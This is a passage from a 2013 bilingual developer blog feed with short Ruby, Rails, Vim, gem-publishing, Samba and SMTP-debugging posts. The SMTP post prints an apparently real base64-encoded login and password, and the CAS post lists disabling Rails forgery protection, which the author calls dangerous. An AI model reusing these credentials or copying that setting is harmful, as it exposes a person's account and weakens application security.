&lt;p&gt; 更多关于 DB 查询的内容请看  ActiveRecordAdditions#accessible_by  与 ControllerAdditions#load_resource  ( 
See ActiveRecordAdditions#accessible_by for how to use this in database queries. These conditions are also used for initial attributes when building a record in ControllerAdditions#load_resource.  )
&lt;/p&gt;
&lt;p&gt;  如果HASH参数不能满足你的要求的话，也可以传入一个block ( 
If the conditions hash does not give you enough control over defining abilities, you can use a block along with any Ruby code you want. ) &lt;/p&gt;
&lt;pre&gt;can :update, Project do |project|
  project.groups.include?(user.group)
end
&lt;/pre&gt;
&lt;p&gt; 
If the block returns true then the user has that :update ability for that project, otherwise he will be denied access. The downside to using a block is that it cannot be used to generate conditions for database queries. &lt;/p&gt;
&lt;p&gt; 也可以指定对某个 object instance 检查ability.  注意，参数是一个symbol ( 
You can pass custom objects into this “can” method, this is usually done with a symbol and is useful if a class isn’t available to define permissions on. ) &lt;/p&gt;
can :read, :stats
can? :read, :stats # =&amp;gt; true
&lt;p&gt;  重要： 方法  can? 不会引用 条件参数 hash 
( IMPORTANT: Neither a hash of conditions or a block will be used when checking permission on a class.  )&lt;/p&gt;
&lt;pre&gt;can :update, Project, :priority =&amp;gt; 3
can? :update, Project # =&amp;gt; true
&lt;/pre&gt;
&lt;p&gt; 如果你想定制can方法的话，那么就如下所示，仅仅传入一个block . 这个方式在你使用db验证时尤其有效 ( 
If you pass no arguments to can, the action, class, and object will be passed to the block and the block will always be executed. This allows you to override the full behavior if the permissions are defined in an external source such as the database. ) &lt;/p&gt;
&lt;pre&gt;can do |action, object_class, object|
  # check the database and return true/false
end
&lt;/pre&gt;

&lt;p&gt; 2. alias_action : &amp;#160;  &lt;/p&gt;

&lt;p&gt; 可以把 多个action 重命名成1个新的。 (Alias one or more actions into another one. )&lt;/p&gt;
&lt;pre&gt;alias_action :update, :destroy, :to =&amp;gt; :modify
can :modify, Comment
Then :modify permission will apply to both :update and :destroy requests.

can? :update, Comment # =&amp;gt; true
can? :destroy, Comment # =&amp;gt; true
&lt;/pre&gt;
&lt;p&gt;（看例子吧，文字描述的让我觉得模糊） This only works in one direction. Passing the aliased action into the “can?” call will not work because aliases are meant to generate more generic actions. &lt;/p&gt;
&lt;pre&gt;alias_action :update, :destroy, :to =&amp;gt; :modify
can :update, Comment
can? :modify, Comment # =&amp;gt; false
Unless that exact alias is used.
can :modify, Comment
can? :modify, Comment # =&amp;gt; true
&lt;/pre&gt;
&lt;p&gt; 下面是已经默认使用的 alias_action了。对read, manage 有疑问的同学可以留意一下了。(The following aliases are added by default for conveniently mapping common controller actions. ) &lt;/p&gt;
&lt;pre&gt;alias_action :index, :show, :to =&amp;gt; :read
# wrong: alias_action :new, :create, :to =&amp;gt; :create
alias_action :new, :to =&amp;gt; :create  
alias_action :edit, :to =&amp;gt; :update
&lt;/pre&gt; 

</description>
      <pubDate>Mon, 28 Jan 2013 06:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/cancan-core-method-can-and-alias-action</link>
    </item>
    <item>
      <title>使用Bundler 开发 rubygem  (Developing a RubyGem using Bundler)</title>
      <description>&lt;p&gt;For English original post, please visit: &amp;#160; &lt;a href="https://github.com/radar/guides/blob/master/gem-development.md" target="_blank"&gt;https://github.com/radar/guides/blob/master/gem-development.md&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;Bundler is a tool created by Carl Lerche, Yehuda Katz, André Arko and various superb contributors for managing Rubygems dependencies in Ruby libraries. Bundler 1.0 was released around the same time as Rails 3 and it's the Rails project where Bundler is probably most well-known usage occurs. But remember, Bundler isn't just for Rails!

Did you know that you can use Bundler for not only gem dependency management but also for writing our own gems? It's really easy to do this and Bundler provides a couple of things to help you along this path.&lt;/p&gt;

&lt;p&gt; 1. bundle gem kaka &lt;/p&gt;
&lt;p&gt; 2. 在kaka.gemspec 文件中，加入：
&lt;/p&gt;
&lt;pre&gt;s.add_development_dependency "rspec", "~&amp;gt; 2.6"  
&lt;/pre&gt;

&lt;p&gt;3. bundle install ，就会有：&lt;/p&gt;
&lt;pre&gt;Using kaka (0.0.1) from source at /path/to/kaka
&lt;/pre&gt;
&lt;p&gt; 4. 实现一个 spec  (很基础但是很重要：）
&lt;/p&gt;
&lt;pre&gt;4.1 $ mkdir spec
4.2 $ vim file:  lib/kaka/dog.rb
module Kaka
    class Dog 
        def self.bark
            "wangwang!"
        end 
    end 
end


4.3 $ vim lib/kaka.rb
+ require "kaka/dog"

4.4  $ vim spec/kaka_spec.rb
require 'kaka'
describe Kaka::Dog do
    it 'should pass' do
        Kaka::Dog.bark.should == "wangwang!"
    end 
    it 'should pluralize a word' do
        Kaka::Dog.pluralize("tomato").should eql("tomatoes")
    end 
end

4.5 $bundle exec rspec spec

&lt;/pre&gt;
 
&lt;p&gt; 5. 引用一个第三方的gem，例如为了使用pluralize方法，我们要使用ActiveSupport: &lt;/p&gt;
&lt;pre&gt;  
gem.add_dependency "activesupport", "&amp;gt;= 2.3.8"
gem.add_dependency "i18n"
&lt;/pre&gt;
&lt;p&gt; 6. $ bundle install &lt;/p&gt;
&lt;p&gt; 7. $ bundle exec rspec spec &lt;/p&gt;
&lt;p&gt; 8. $ rake build &lt;/p&gt;
&lt;pre&gt;kaka 0.0.1 built to pkg/kaka-0.0.1.gem
&lt;/pre&gt;
&lt;p&gt; 9. $ gem install pkg/kaka-0.0.1.gem &lt;/p&gt;</description>
      <pubDate>Mon, 28 Jan 2013 01:44:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/developing-a-rubygem-using-bundler</link>
    </item>
    <item>
      <title>版本号的规范命名方式( Semantic Versioning  )</title>
      <description>&lt;p&gt; 今天看到了这个文章，终于知道了各种版本号的命名和由来。 贴在这里。 
原文见： &lt;a href="http://semver.org/"&gt;http://semver.org/&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;刚才搜索了一下， Semantic Versioning的中文翻译很多版本， 有叫“语义法版本控制”的，有叫”语义法版本命名“的，也有”规范命名法“的。 &amp;#160;这里 Semantic是语义（？）， Versioning 肯定是版本命名的意思了。 &amp;#160;所以想了一下，我也不翻译了，直接叫Semantic Versioning.&amp;#160;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;使用这套命名法，必须要有公共的API。 &amp;#160;Software using Semantic Versioning MUST declare a public API. This API
could be declared in the code itself or exist strictly in documentation.
However it is done, it should be precise and comprehensive. &amp;#160;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;正常的版本号应该形如 x.y.z. &amp;#160; x,y,z 都必须是正数或者0. &amp;#160; &amp;#160;X： 主要版本，Y：次要版本号，Z： 补丁号。 增长的次序都是每次+1&amp;#160;&lt;/p&gt;
&lt;p&gt;A normal version number MUST take the form X.Y.Z where X, Y, and Z are
non-negative integers. X is the major version, Y is the minor version, and Z
is the patch version. Each element MUST increase numerically by increments of
one. For instance: 1.9.0 -&amp;gt; 1.10.0 -&amp;gt; 1.11.0.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;当主要版本号增加时，后面的版本号都清零。&lt;/p&gt;
&lt;p&gt;When a major version number is incremented, the minor version and patch
version MUST be reset to zero. When a minor version number is incremented, the
patch version MUST be reset to zero. For instance: 1.1.3 -&amp;gt; 2.0.0 and 2.1.7 -&amp;gt;
2.2.0.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;....没看明白。。。&lt;/p&gt;
&lt;p&gt;Once a versioned package has been released, the contents of that version
MUST NOT be modified. Any modifications must be released as a new version.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;0.y.z 是初始化版本，表示各种API都有随时变化的可能性，很不稳定。&lt;/p&gt;
&lt;p&gt;Major version zero (0.y.z) is for initial development. Anything may change
at any time. The public API should not be considered stable.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;1.0.0 中的API就固定下来了。&lt;/p&gt;
&lt;p&gt;Version 1.0.0 defines the public API. The way in which the version number
is incremented after this release is dependent on this public API and how it
changes.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Patch version Z (x.y.Z | x &amp;gt; 0) MUST be incremented if only backwards
compatible bug fixes are introduced. A bug fix is defined as an internal
change that fixes incorrect behavior.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Minor version Y (x.Y.z | x &amp;gt; 0) MUST be incremented if new, backwards
compatible functionality is introduced to the public API. It MUST be
incremented if any public API functionality is marked as deprecated. It MAY be
incremented if substantial new functionality or improvements are introduced
within the private code. It MAY include patch level changes. Patch version
MUST be reset to 0 when minor version is incremented.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Major version X (X.y.z | X &amp;gt; 0) MUST be incremented if any backwards
incompatible changes are introduced to the public API. It MAY include minor
and patch level changes. Patch and minor version MUST be reset to 0 when major
version is incremented.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A pre-release version MAY be denoted by appending a dash and a series of
dot separated identifiers immediately following the patch version. Identifiers
MUST be comprised of only ASCII alphanumerics and dash [0-9A-Za-z-].
Pre-release versions satisfy but have a lower precedence than the associated
normal version. Examples: 1.0.0-alpha, 1.0.0-alpha.1, 1.0.0-0.3.7,
1.0.0-x.7.z.92.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A build version MAY be denoted by appending a plus sign and a series of dot
separated identifiers immediately following the patch version or pre-release
version. Identifiers MUST be comprised of only ASCII alphanumerics and dash
[0-9A-Za-z-]. Build versions satisfy and have a higher precedence than the
associated normal version. Examples: 1.0.0+build.1, 1.3.7+build.11.e0f985a.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Precedence MUST be calculated by separating the version into major, minor,
patch, pre-release, and build identifiers in that order. Major, minor, and
patch versions are always compared numerically. Pre-release and build version
precedence MUST be determined by comparing each dot separated identifier as
follows: identifiers consisting of only digits are compared numerically and
identifiers with letters or dashes are compared lexically in ASCII sort order.
Numeric identifiers always have lower precedence than non-numeric identifiers.
Example: 1.0.0-alpha &amp;lt; 1.0.0-alpha.1 &amp;lt; 1.0.0-beta.2 &amp;lt; 1.0.0-beta.11 &amp;lt;
1.0.0-rc.1 &amp;lt; 1.0.0-rc.1+build.1 &amp;lt; 1.0.0 &amp;lt; 1.0.0+0.3.7 &amp;lt; 1.3.7+build &amp;lt;
1.3.7+build.2.b8f12d7 &amp;lt; 1.3.7+build.11.e0f985a.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;</description>
      <pubDate>Fri, 25 Jan 2013 10:21:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/semantic-versioning</link>
    </item>
    <item>
      <title>建立一个rubygem ( how to create a ruby gem)</title>
      <description>&lt;p&gt;参考：&amp;#160; &lt;a href="http://guides.rubygems.org/make-your-own-gem/"&gt;http://guides.rubygems.org/make-your-own-gem&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. 假设你的gem名字是 "hola", 就要先建立这样的目录结构。（记得 lib下要有个跟项目同名的rb文件哦）&lt;/p&gt;
&lt;pre&gt;% tree
.
├── hola.gemspec
└── lib
    └── hola.rb
&lt;/pre&gt;

&lt;p&gt;2.  编辑 lib/hola.rb 这个文件，让它看起来如下：&lt;/p&gt;
&lt;pre&gt;class Hola
  def self.hi
    puts "Hello world!"
  end
end
&lt;/pre&gt;

&lt;p&gt;3. 编辑 hola.gemspec ,  &lt;/p&gt;
&lt;pre&gt;% cat hola.gemspec
Gem::Specification.new do |s|
  s.name        = 'hola'
  s.version     = '0.0.0'
  s.date        = '2010-04-28'
  s.summary     = "Hola!"
  s.description = "A simple hello world gem"
  s.authors     = ["Nick Quaranto"]
  s.email       = 'nick@quaran.to'
  s.files       = ["lib/hola.rb"]
  s.homepage    =
    'http://rubygems.org/gems/hola'
end
&lt;/pre&gt;

&lt;p&gt; 4. 建立这个gem ，并且在本地安装它&lt;/p&gt;
&lt;pre&gt;% gem build hola.gemspec
Successfully built RubyGem
Name: hola
Version: 0.0.0
File: hola-0.0.0.gem

% gem install ./hola-0.0.0.gem
Successfully installed hola-0.0.0
1 gem installed
&lt;/pre&gt;
&lt;p&gt; 5. 试试这个gem ... &lt;/p&gt;
&lt;pre&gt;% irb
&amp;gt;&amp;gt; require 'hola'
=&amp;gt; true
&amp;gt;&amp;gt; Hola.hi
Hello world!
&lt;/pre&gt;
&lt;p&gt; 6. 在 rubygems.org 上注册并且登录，进入到profile 界面，就会发现  &lt;/p&gt;
&lt;pre&gt;API Access
Your API key is 6cd7fafaeb3b7f721da09686f9668???.
If you want to use gem commands from the command line, you'll need a ~/.gem/credentials file, which you can generate using the following command:
$ curl -u Siwei Shen https://rubygems.org/api/v1/api_key.yaml &amp;gt; ~/.gem/credentials
&lt;/pre&gt;
&lt;p&gt;7. push this gem to rubygems.org&lt;/p&gt;
&lt;pre&gt;% gem push hola-0.0.0.gem
Pushing gem to RubyGems.org...
Successfully registered gem: hola (0.0.0)
&lt;/pre&gt;

&lt;p&gt; 8 . 来个稍微复杂点儿的文件结构：&lt;/p&gt;
&lt;pre&gt;.
├── hola.gemspec
└── lib
    ├── hola
    │   └── translator.rb
    └── hola.rb

% cat lib/hola/translator.rb
class Hola::Translator
  def initialize(language)
    @language = language
  end

  def hi
    case @language
    when :spanish
      "hola mundo"
    else
      "hello world"
    end
  end
end

% cat lib/hola.rb
class Hola
  def self.hi(language = :english)
    translator = Translator.new(language)
    translator.hi
  end
end

require 'hola/translator'
&lt;/pre&gt;

&lt;p&gt; 然后在irb中试一下： &lt;/p&gt;
&lt;pre&gt;% irb -Ilib -rhola
irb(main):001:0&amp;gt; Hola.hi(:english)
=&amp;gt; "hello world"
irb(main):002:0&amp;gt; Hola.hi(:spanish)
=&amp;gt; "hola mundo"
&lt;/pre&gt;</description>
      <pubDate>Fri, 25 Jan 2013 09:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/how-to-create-a-rubygem</link>
    </item>
    <item>
      <title>在本地搭建gem server的考虑 ( setup gem server on local  )</title>
      <description>&lt;p&gt;$ gem server 是个好东西。 &amp;#160;(gem server is easy to use )&lt;/p&gt;
&lt;p&gt;优点：1. 命令简单。 2. 可以 gem rdoc --all &amp;#160;或者 gem rdoc &amp;lt;gem_name&amp;gt; 来生成对应的api &amp;#160; ( advantages : simple , and could generate all the gem's doc )&amp;#160;&lt;/p&gt;
&lt;p&gt;缺点：每次都要手动运行。(disadvantages: &amp;#160;have to run it manually everytime)&amp;#160;&lt;/p&gt;
&lt;p&gt;如果我希望我的nginx能运行 gem server? 貌似没办法 &amp;#160;( seems impossible to use nginx to replace 'gem server')&amp;#160;&lt;/p&gt;
&lt;p&gt;如果你用max os, 可以试试这个：http://gugod.org/2010/09/local-gem-server/ &amp;#160; (if using max os, you could probably try this: )&lt;/p&gt;
&lt;p&gt;p.s. what about run 'gem server' as a nohup command?&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 25 Jan 2013 03:43:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setup-gem-server-locally</link>
    </item>
    <item>
      <title>VIM中的recording ( using recording in VIM )</title>
      <description>&lt;p&gt;recording 是一个高级功能，对于我来说。所以我一直没有学习哈哈。前天又做了一件人肉替换字符串的事儿，我觉得实在不能再忍了，于是今天早上使用了一下，感觉良好。 (Recording is an advanced feature in VIM and I am too busy these days, so I haven't paid any time on it. However the day before yesterday, I have to do a job that containing of many duplicated operations which could &amp;amp; should be done automatically. So I make my decision to learn how to use this feature)&amp;#160;&lt;/p&gt;
&lt;p&gt;这个例子是： 把一个文本中的某个字，做一些替换。工作量呢，用人肉做不小，但是专门写个ruby脚本又显得过度重量了。(this example shown below is the case I met -- change some string by some patterns -- a Ruby script is too heavyweight, but manually doing it is too boring... so &amp;#160;... ^_^)&lt;/p&gt;
&lt;p&gt;把这段代码：&lt;/p&gt;
&lt;pre&gt;  link1
  link2
  link3
&lt;/pre&gt;
&lt;p&gt;替换成下面：&lt;/p&gt;
&lt;pre&gt;&lt;a href="link1"&gt;link1&lt;/a&gt;
&lt;br /&gt;
&lt;a href="link2"&gt;link2&lt;/a&gt;
&lt;br /&gt;
&lt;a href="link3"&gt;link3&lt;/a&gt;

&lt;/pre&gt;
&lt;p&gt;所以，使用 VIM 的recording 正好，步骤是： &amp;#160;( so the steps are: )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 在普通模式下 按qq ( q&amp;lt;寄存器名&amp;gt; , 这里我为了方便，使用了 q ) &amp;#160; ( press 'qq' in normal mode )&amp;#160;&lt;/p&gt;
&lt;p&gt;2. 开始编辑。 (edit it)&amp;#160;&lt;/p&gt;
&lt;p&gt;3. 编辑好后，回到普通模式，再次按下 q . 表示录制结束 &amp;#160;( press 'q' again when you have done the edit in normal mode)&amp;#160;&lt;/p&gt;
&lt;p&gt;4. 跳到第二行，然后按 @+q, &amp;#160;就会发现，第二行变化啦～ ( jump to the line you want to make changes and press '@q', see what happens~ )&lt;/p&gt;
&lt;p&gt;5. 引申： 如果想一次操作多行，输入 5@q， 就可以操作接下来的5行哦亲～ &amp;#160;(further more, press 'n@q' to apply the changes on the following n lines )&amp;#160;&lt;/p&gt;

</description>
      <pubDate>Tue, 22 Jan 2013 02:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-recording-in-vim</link>
    </item>
    <item>
      <title>调试SMTP 邮件服务器（看是否使用了BASE64 编码验证）(debug SMPT server to see if the BASE64 encoding is on )</title>
      <description>&lt;p&gt;参考： &lt;a href="http://help.netmail.com/display/KB/How+to+test+SMTP+AUTH+using+base64+format"&gt; http://help.netmail.com/display/KB/How+to+test+SMTP+AUTH+using+base64+format &lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1.  telnet smtp.yoursite.com 25&lt;/p&gt;
&lt;p&gt;2.  EHLO   (看是否有 auth login )( to see if there's "auth login" string )&lt;/p&gt;
&lt;p&gt;3.  auth login  &lt;/p&gt;
&lt;pre&gt;auth login
334 VXNlcm5hbWU6
c2hlbnNpd2Vp ( 这里输入 base64 encoded username) 
334 UGFzc3dvcmQ6
c3NzMzMzJCQkNDQ0 ( base64 encoded password) 
235 2.7.0 Authentication successful
&lt;/pre&gt;
&lt;p&gt;&amp;#160;记得，你的邮箱名字一般不要超过20个字！否则会被自动截断！例如： &amp;#160;(remember don't make your login name longer than 20 characters length)&amp;#160;&lt;br /&gt;notifier-of-push-ops &amp;#160;就很好 &amp;#160;(OK! )&lt;br /&gt;notifier-of-push-ops-system 就超过了！ &amp;#160; &amp;#160; &amp;#160; ( 26 digits length! auth will failed! )&lt;/p&gt;
</description>
      <pubDate>Tue, 15 Jan 2013 09:57:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/debug-smpt-server-to-see-if-the-base64-encoding-is-on</link>
    </item>
    <item>
      <title>安装selenium IDE ( correct URL to install selenium IDE) </title>
      <description>&lt;p&gt;1.  由于现有的URL失效（ , 所以直接在这个页面中下载： &amp;#160;( due to the related url is out-of-date, please come to this link to download: )&amp;#160;&lt;br /&gt;http://seleniumhq.org/download/&lt;/p&gt;
&lt;p&gt;2. 也可以看这里下载 http://code.google.com/p/selenium/wiki/SeIDEReleaseNotes &amp;#160;( or come here: )&lt;/p&gt;
&lt;p&gt;3. 之后就可以了。  单独在 firefox中搜索 addons 不行。 &amp;#160;( then it will install selenium IDE for you. if you want to install it from firefox's addons , you will fail )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Tue, 15 Jan 2013 09:54:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/correct-url-to-install-selenium-ide</link>
    </item>
    <item>
      <title>安装JENKINS时记得要安装GIT PLUGIN哦亲！ (when installing JENKINs , remember to install its 'Git plugin!' ) </title>
      <description>&lt;p&gt;参考：  https://wiki.jenkins-ci.org/display/JENKINS/Meet+Jenkins&lt;/p&gt;
&lt;p&gt;1. download jdk&lt;br /&gt;2. download tomcat&lt;br /&gt;3. remember to: install GIT plugin!!!! &amp;#160;&lt;/p&gt;</description>
      <pubDate>Tue, 15 Jan 2013 09:52:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/remember-to-install-git-plugin-when-installing-jenkins</link>
    </item>
    <item>
      <title>UBUNTU访问 WINDOWS 资源 (access windows resources from Linux using samba)</title>
      <description>&lt;p&gt;参考(refer to)：&lt;a href="http://wiki.ubuntu.com.cn/Samba#.E5.AE.89.E8.A3.85Samba" title="http://wiki.ubuntu.com.cn/Samba#.E5.AE.89.E8.A3.85Samba" target="_blank"&gt;http://wiki.ubuntu.com.cn/Samba#.E5.AE.89.E8.A3.85Samba&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;1. sudo apt-get install samba &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;需要加上文件夹的名字使 server这个参数完整，同时不要使用-L 这个参数。 例如： &amp;#160;（you should not use -L &amp;#160;as the parameter if you met this error:&amp;#160;&lt;/p&gt;
&lt;p&gt;session request to *SMBSERVER failed (Called name not present)&lt;br /&gt;NetBIOS over TCP disabled -- no workgroup available &amp;#160; )&amp;#160;&lt;/p&gt;
&lt;p&gt;下面是一个实际的例子： (below is a real example )&amp;#160;&lt;/p&gt;
&lt;p&gt;$ smbclient --user=&amp;lt;group_name&amp;gt;/shensiwei //10.10.0.70/IT文档 &amp;#160; &amp;#160; &amp;#160; ( shensiwei 是用户名 )&amp;#160;&lt;/p&gt;
&lt;p&gt;来使用跟FTP 差不多的方式来 GET， PUT 各种文件 &amp;#160;( and type 'help' once you logged in, you can see 'put' , 'get' and other similar commands with FTP)&lt;/p&gt;</description>
      <pubDate>Tue, 15 Jan 2013 09:39:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/access-windows-resources-from-linux-using-samba</link>
    </item>
    <item>
      <title>VIM 的tab用法（tabs in vim)</title>
      <description>&lt;p&gt;VIM 中的tab 一直是我希望学习使用的东西，可惜过去时间总是不够，没时间学习，就暂时使用 terminal tabs 代替了。 &amp;#160;( The 'tab' in VIM is a interesting concept that I have been always focusing on, but unluckily I don't have enough time to spend time learning it. so ... I have to use the "terminal tabs " instead. &amp;#160;)&lt;/p&gt;
&lt;p&gt;但有时候terminal tabs 不如VIM 灵活。比如，我不希望在terminal tab中切换来切换去， 而且不知道是该 ctrl + tab 还是 alt + tab 还是 &amp;#160;ctrl + up , ctrl + down. &amp;#160;( However, it's not always good to use 'terminal tabs' instead of 'VIM tabs', such as, when I want to just open &amp;#160;2 terminals &amp;#160;without tab --- so that I just need to switch my window by typing 'alt+ tab' , but not mixing 'alt + tab' and 'ctrl + tab' , 'ctrl + pageup' and 'ctrl + pagedown' .... .er.... *_* )&amp;#160;&lt;/p&gt;
&lt;p&gt;所以我记录一下VIM 的tab 用法： ( so, let me record the usages of VIM tabs: )&amp;#160;&lt;/p&gt;
&lt;pre&gt;:tabnew             new tab
:gt/:tabnext             next tab
:gT/:tabprevious      previous tab

1gt :                  jump to the 1st tab
[n]gt:             jump to the n tab
&lt;/pre&gt;</description>
      <pubDate>Fri, 11 Jan 2013 06:40:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/vim-tab-usage</link>
    </item>
    <item>
      <title>asset_path 在rspec中的使用 ( use asset_path in rspec )</title>
      <description>&lt;p&gt;今天很奇怪，我在测试 helper 时，居然遇到了 这个问题： ( today I met a strange problem when testing a Rails helper which called asset_path ) &lt;/p&gt;
&lt;pre&gt;undefined method `asset_path' for #&amp;lt;rspec::core::examplegroup::nested_2:0x8b35aa8&amp;gt;&lt;/pre&gt;
&lt;p&gt;解决办法很简单： 加上下面这句就好了 ( the solution is simple: add the line of code to the spec_helper file, shown as below ) &lt;/p&gt;

&lt;pre&gt;# spec_helper.rb 
 RSpec.configure do |config|
   config.include Sprockets::Helpers::RailsHelper
 end
&lt;/pre&gt;
&lt;p&gt;原因：(reason) 
"asset_path" isn't a routing URL helper, it's a Sprocket helper.   出自：&lt;a href="http://rubyforge.org/pipermail/rspec-users/2011-September/020619.html"&gt;http://rubyforge.org/pipermail/rspec-users/2011-September/020619.html&lt;/a&gt; &lt;/p&gt;</description>
      <pubDate>Tue, 08 Jan 2013 09:45:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/use-asset-path-in-rspec</link>
    </item>
    <item>
      <title>rspec中模拟CAS 登录( mock login for CAS ) </title>
      <description>&lt;p&gt;非常简单，用这个： &amp;#160;( 1 line of code: )&amp;#160;&lt;/p&gt;
&lt;pre&gt;CASClient::Frameworks::Rails::Filter.fake("some_user")&lt;/pre&gt;
&lt;p&gt;例如： &amp;#160;(e.g. )&amp;#160;&lt;/p&gt;
&lt;p&gt;# spec_helper.rb &amp;#160;: define a method called 'login')&lt;/p&gt;
&lt;pre&gt; def login
   CASClient::Frameworks::Rails::Filter.fake("some_user")
 end
&lt;/pre&gt;
&lt;p&gt;然后就可以调用它了. ( then you can call it in your rspec files: )&amp;#160;&lt;/p&gt;
&lt;pre&gt;# in some rspec file
require 'spec_helper'

describe MessagesController do
  render_views
  before do
    login
    @message = FactoryGirl.create(:message, :vid =&amp;gt; 1, :title =&amp;gt; "test")
  end 
  it "should get show"  do  
    get :show, :id =&amp;gt; @message.id
    response.should be_success
  end 
end
&lt;/pre&gt;</description>
      <pubDate>Thu, 20 Dec 2012 10:14:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/mock-login-for-cas</link>
    </item>
    <item>
      <title>关于 RUBY CAS client 和 single sign out (about ruby-cas-client and single sign out ) </title>
      <description>&lt;p&gt;昨天搭建了ruby cas server, 今天使用了一下，效果良好。 &amp;#160; ( I setup my CAS server yesterday, and it's running well)&amp;#160;&lt;/p&gt;
&lt;p&gt;下面是使用ruby CAS CLIENT的步骤： &amp;#160;(参考：&lt;a href="http://sg552.iteye.com/blog/1297538"&gt;http://sg552.iteye.com/blog/1297538&lt;/a&gt; ) &amp;#160;( below is about how to use rubycas-client )&amp;#160;&lt;/p&gt;
&lt;p&gt;0. 在  Gemfile中，加入： &amp;#160;&amp;#160;&lt;br /&gt;gem 'rubycas-client'&lt;br /&gt;然后 $sudo bundle&lt;br /&gt;注意： 不要使用 'rubycas-client-rails' 这个GEM。 &amp;#160; &amp;#160;( notice: don't use 'rubycas-client-rails' gem, it's unstable and unnecessary &amp;#160;)&lt;/p&gt;
&lt;p&gt;1. environment.rb: 的结尾，加上： &amp;#160; ( add your cas server url to this file)&amp;#160;&lt;br /&gt;CASClient::Frameworks::Rails::Filter.configure(&lt;br /&gt;  :cas_base_url =&amp;gt; "http://192.168.56.10:8080/cas-server-webapp-3.4.11 "&lt;br /&gt;)&lt;/p&gt;
&lt;p&gt;2. application_controller.rb&lt;br /&gt;before_filter CASClient::Frameworks::Rails::Filter&lt;/p&gt;
&lt;p&gt;3. 进入某个controller :  (例如 fish_controller.rb) ， 定义退出的action &amp;#160;(define the logout method )&amp;#160;&lt;/p&gt;
&lt;pre&gt; 
def class fish_controller
  def logout
     CASClient::Frameworks::Rails::Filter.logout(self)
  end
end
&lt;/pre&gt;
&lt;p&gt;4. 修改 route.rb ，加入退出的链接： (add the naming route)&lt;/p&gt;
&lt;pre&gt;Dudufish::Application.routes.draw do
   resources :fish
   match '/logout' =&amp;gt; "fish#logout", :as =&amp;gt; :logout
end 
&lt;/pre&gt;
&lt;p&gt;5. 修改  application.html.erb 布局文件，增加这个链接。  关键的一点是： 在经典的rails authorization 框架用，都是用 current_user  这个变量取得当前登陆的用户。 在CAS CLIENT中，用的是 session[:cas_user] , 只取得当前用户名，是一个string.  而不是一个model. &amp;#160; ( NOTICE: &amp;#160;use session[:cas_user] to get the current_user information. &amp;#160; )&amp;#160;&lt;/p&gt;
&lt;p&gt;&amp;lt;div style="border: 1px solid green"&amp;gt;&lt;br /&gt;  &amp;lt;%= session[:cas_user] %&amp;gt; &lt;br /&gt;&amp;lt;/div&amp;gt;&lt;br /&gt;&amp;lt;% if session[:cas_user] %&amp;gt;&lt;br /&gt;   &amp;lt;%= link_to "logout" , logout_path %&amp;gt; &lt;br /&gt;&amp;lt;% end %&amp;gt;&lt;/p&gt;
&lt;p&gt;至于single sign out, 暂时就不设置了。 &amp;#160;不过有需要的同学可以参考一下： &amp;#160;(about single sign on, I decide to leave it there and don't touch it . but if you insist on using it, follow the steps below )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 在服务器端（ruby cas server) ,修改 config.yml, &amp;#160; &amp;#160;(change the config file from server side: )&lt;br /&gt;enable_single_sign_out = true&lt;/p&gt;
&lt;p&gt;2. 在客户端， (from client side)&amp;#160;&lt;br /&gt;&amp;#160; 2.1 使用 数据库保存 &amp;#160;session &amp;#160; &amp;#160;&amp;#160;&lt;br /&gt;&amp;#160; &amp;#160; config.action_controller.session_store = :active_record_store&lt;br /&gt;&amp;#160; 2.2 修改application.rb&amp;#160;&lt;br /&gt;&amp;#160; &amp;#160; self.allow_forgery_protection = false&lt;br /&gt;&amp;#160; 2.3 在 CAS client的设置中， &amp;#160;&lt;br /&gt;&amp;#160; &amp;#160;&amp;#160;:enable_single_sign_out =&amp;gt; true&lt;/p&gt;
&lt;p&gt;我本来想这样弄，但是考虑到： &amp;#160; (considering the factors below, I don't want to use single-sign-on )&amp;#160;&lt;br /&gt;1. 这样太麻烦。 我怕让其他应用该起来太麻烦。 &amp;#160;( complicated, for both ruby and other language applications )&lt;br /&gt;2. 可以把 session有效时间缩短些，比如 闲置15分钟，就需要重新登录（默认是5分钟） &amp;#160;( to shorten the unused-session-time could satisfy our need )&amp;#160;一样可以&lt;br /&gt;3. 去掉了 forgery protection 安全性下降太多。 ( it's dangerous to disable the forgery protection)&amp;#160;&lt;/p&gt;
&lt;p&gt;所以 我不打算使用 single sign on 这个特性。&lt;/p&gt;</description>
